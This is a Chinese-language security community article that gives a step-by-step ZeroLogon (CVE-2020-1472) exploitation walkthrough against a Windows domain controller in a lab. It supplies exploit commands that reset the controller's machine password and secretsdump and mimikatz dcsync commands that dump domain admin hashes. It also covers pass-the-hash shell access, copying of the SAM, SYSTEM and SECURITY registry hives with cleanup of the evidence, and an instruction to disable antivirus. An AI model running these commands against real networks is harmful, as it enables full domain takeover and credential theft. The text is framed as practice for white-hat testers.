> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3aJp9TTIomLLjMjR4mkzow)

公众号

**漏洞介绍**

在去年 9 月份，国外披露了 CVE-2020-1472(又被叫做 ZeroLogon) 的漏洞详情，网上也随即公开了 Exp。

是近几年 windows 上比较重量级别的一个漏洞。通过该漏洞，攻击者只需能够访问域控的 445 端口，在无需任何凭据的情况下能拿到域管的权限。

该漏洞的产生来源于 Netlogon 协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。该漏洞的最稳定利用是调用 netlogon 中 RPC 函数 NetrServerPasswordSet2 来重置域控的密码，从而以域控的身份进行 Dcsync 获取域管权限。CVE-2020-1472 来重置域控密码。

注意，这里是域控密码，不是域管的密码。是域控这个机器用户的密码。可能对域不是很熟悉的人对这点不是很了解。在域内，机器用户跟域用户一样，是域内的成员，他在域内的用户名是机器用户 +$(如 DC2016\$)，在本地的用户名是 SYSTEM。

在拥有域控的机器用户密码的情况下，并不能直接使用该密码登录域控，因为机器用户是不可以登录的，但是因为域控的机器用户具备 Dcsync 特权，我们就可以滥用该特权来进行 Dcsync。

**环境**

攻击机 windows 10  

域控服务器 windows server 2012 192.168.139.147

python 3.8

**准备工具**

*   https://github.com/VoidSec/CVE-2020-1472  
    
*   https://github.com/maaaaz/impacket-examples-windows 【这是下面包中脚本转成的 exe】
    
*   https://github.com/SecureAuthCorp/impacket
    

impacket 需要使用最新的要用 Impacket v0.9.22.dev1+20200915.160006.1397e2b5，并不是 release 中，或者 pip 中直接指定的

建议: git clone 

https://github.com/SecureAuthCorp/impacket.git

**当然也可以直接：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLc8n8hQA9AfDYvXY3KauibMcYIO5UXzHGkBsrbciazOD9Dy10QoJTlz9g/640?wx_fmt=png)

其次如果使用的 linux，执行脚本在出现 $ 之类的特殊字符需要 \ 转义，我在 window 下执行，没遇到这个问题，域和计算机名搞混淆，导致参数填写错误，哪个是域，哪个是计算机名，看下图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLRgKQudo477KFiaseVnN2Qpoey1eDfAUJicHkaAcsXGkZBZ9Mpq3vkBnw/640?wx_fmt=png)

**关于坑点**

在 windows 中有 python 启动器，py -3 指定使用 python3，防止选错 python 版本。  

安装 impacket 这步，手动安装，并且把 requirements.txt 中的 impacket==0.9.21 这行去掉，不然执行 py -3 pip install -r requirements.txt 安装其他库时，impacket 又装一遍，会覆盖掉最新版。

**安装过程**

先卸载旧版本

```
py -3 -m pip uninstall impacket
```

安装新版本

```
git clone 
https://github.com/SecureAuthCorp/impacket
cd impacket
py -3 setup.py install
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLt2wvT0nCSUFibATIjI2K62dBsm0vhOxXyLFrFqkzia0ibibTG6tFDTAncg/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLoeJECHsFqibiaVTviabxosNJsAHgVE4WhxN8HTGuWKibDAPmB09wNlX5Mg/640?wx_fmt=png)

**报错说明**

AttributeError:  

```
module'impacket.dcerpc.v5.nrpc' has no attribute 'NetrServerPasswordSet2'，属于坑点1，手动安装impacket解决。
```

secretsdump.py 执行后无法获取 NTDS.DIT 信息，多半是域和计算机名混淆或者出现 $ 未转义，对照坑点计算机名确认。  

```
[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

多半是域和计算机名混淆或者出现 $ 未转义, 对照坑点 3 的图片，确认下, 自己环境中对应的参数填写正确没。  

**利用**

环境准备就绪以后，运行 exp，记得关杀软  

```
py -3 cve-2020-1472-exploit.py -n DC -t 192.168.1.150
-n 计算机名
-t 域控ip
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDL45re3gvw1ARpeJ0qyicppJoyrWZs2odCESUhcaQHw14h5RZRkib9sCGA/640?wx_fmt=png)

检测到存在漏洞, Y 继续清空域控密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLBIHXpjOQQzNNW1cWg6jwSXuv0tXO5dzicWXZYicE68tKaNn4UGR5ofiaA/640?wx_fmt=png)

成功之后用刚刚下载的

impacket-examples-windows

通过 secretsdump.exe dump 域管 hash

```
.\secretsdump.exe -no-pass -just-dc DC$@192.168.1.150
-no-pass 无密码登录
-just-dc 仅提取NTDS.DIT数据（NTLM哈希和Kerberos键）
DC$@192.168.1.150 计算机名$@域控ip
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLk3c1A8SN7wAnYRVWRQ9mjMlv48Q02jM4F1TztdpTxFicIGcm5ibnDRDQ/640?wx_fmt=png)

获取域控机器 shell 和 导出域控计算机帐户的原始 NT 哈希

```
hashes 域管理员的nthash:lmhash
.\wmiexec.exe–hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab
test.com/administrator@192.168.1.150
```

此时会返回一个交互式域控 shell  

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLVg2Iq6ibSCGQnoicqU6IgkN2LrOyNgzX9DP5sJPqVoxqIic0mHCB5TszA/640?wx_fmt=png)

**本地保存文件**

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
```

**下载文件**  

```
get system.save
get sam.save
get security.save
```

**擦屁股**  

```
del /f system.save
del /f sam.save
del /f security.save
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLZao2n3baUYOZKyF2yPmRDo8urQ1hciciaDWJllm7QicJlGriaeXE16PaiaQ/640?wx_fmt=png)

读取下载的文件计算原本的机器用户密码

```
.\ secretsdump.exe -sam sam.save -system system.save -security security.save LOCAL
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLxZVjUcf2WJC4VhNcFEYdGdfbcwpkEIsfzbmWUOU6icdsdcnMgEyQGEA/640?wx_fmt=png)

随后把密码锤回去，这里使用的值是 $MACHINE.ACC: 后的 hash

```
.\secretsdump.exe -no-pass -just-dc DC$@192.168.1.150
-no-pass 无密码登录
-just-dc 仅提取NTDS.DIT数据（NTLM哈希和Kerberos键）
DC$@192.168.1.150 计算机名$@域控ip
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLwUbetjTlZdLr84ibFY2Lvo7DJSPGdpyialiaLHIiboZBkredyQBBmeoELg/640?wx_fmt=png)

**Mimikatz 利用方式**

**探测是否存在漏洞**  

```
lsadump::zerologon/target:192.168.1.150 /account😃C$
lsadump::zerologon/target:192.168.1.150 /account😃C$ /exploit 攻击
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLYWjK7HmeO68sU3Isf1ErBw7BxPyFUcibLMJqt8ibfGc1w57h3selRKZg/640?wx_fmt=png)

```
lsadump::dcsync /domain:test.com /dc😃C /user:Administrator/authuser😃C$/authdomain:test/authpassword:""/authntlm
```

---- 通过 dcsync dump 域管 hash

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLQsXsN0uUz4ziaAOAFQ5KFiccG6QN57oMfkW2TjJQyXxGxGjKbP6F952g/640?wx_fmt=png)

**提升权限注入会话**

```
privilege::debug
sekurlsa::pth/user:Administrator/doamin:. /rc4:570a9a65db8fba761c1008a51d4c95ab
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLbcIeKgdfTGw1IgSPvugJTeyurJlIU2ATzsw7PnG1XrcNxjHWDuJtsg/640?wx_fmt=png)

在注入会话的窗口打开 mimikatz 恢复机器用户密码 随后可以开始下一步操作

```
lsadump::postzerologon /target:192.168.1.150 /account😃C$
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLbMKGkLzBIGmpMGzaItGmMTiaPngkN3VgGAISh5qevPUdovibbQJhFthg/640?wx_fmt=png)

**参考：**

1.https://www.t00ls.net/viewthread.php?tid=57866&extra=&highlight=cve-2020-1472&page=1

2.https://mp.weixin.qq.com/s/S9Hwb1-lLhh4QfI4b551SQ

**【火线 zone 社区周激励】**

2021.12.6 ～ 2021.12.12 公告

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSbtOdh5nXHf5SvicnmEmOyeaOCWXTDCicads0MpeNakyZIRvkruNAKMChCuuY5hMXQg6HAia9AbJB7g/640?wx_fmt=png)

**【相关精选文章】**

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaRspTaGZmg62vGicGkXdvJDLtKereRSEX6oOibBalCSKCfW8v1rVcJyhhicpicYjmb1sIEjuxvuBibW8hQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490494&idx=1&sn=09401d751eea65246d8b2bc821297417&chksm=eaaa939edddd1a88a8a8a1a77df9f793565a4435ebc7162cc6d86a26d0b08d8356517d2b2c15&scene=21#wechat_redirect)

  

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSbtOdh5nXHf5SvicnmEmOyef8AJTFtibI8Kbnqiaia9qIfxiafuDbiaArBHsiaao9iaQNfOyibryVygpOfVGA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490431&idx=1&sn=89bcc0f5806742c5b178e8714ed810a7&chksm=eaaa935fdddd1a49d1fc5a50b376a6b5fe5cc2642cd4f328c0573138c16fe30cd506d2daf750&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSIRfXwN7wia1oIahwLqmXPfRtichicicJVra12DfCPDL7zlPUDu7MQYN3777icH4qp4AVkJpJ671ib2v3w/640?wx_fmt=png)

火线 Zone 是 [火线安全平台] 运营的封闭式实战安全攻防社区，研究讨论实战攻防技术，平台向顶尖的白帽子提供安全测试的云端基础设施，目前火线的高级白帽子数量已经近万人，欢迎具备分享和探索精神的白帽子加入火线 Zone 社区，共建一个有技术氛围的优质社区！

如需转载火线 Zone 公众号内的文章请联系火线小助手：hxanquan（微信）

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSIRfXwN7wia1oIahwLqmXPfk0BkkSxLM7fHmYJ9NVhfjTV0T3uDmribomicSNL3lN2LlOIGKoGAB9fA/640?wx_fmt=jpeg)

 **微信号** 

huoxian_zone

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/YxSSnpu6MW0CIoKC0f9U1ALN0bHmzzVfdqHmAlujAniaYos5t6H3zUomx1QoILFNCMdeV5eknVH2AfsYvjfV6iag/640?wx_fmt=gif)

点击阅读原文，加入社区，共建一个有技术氛围的优质社区！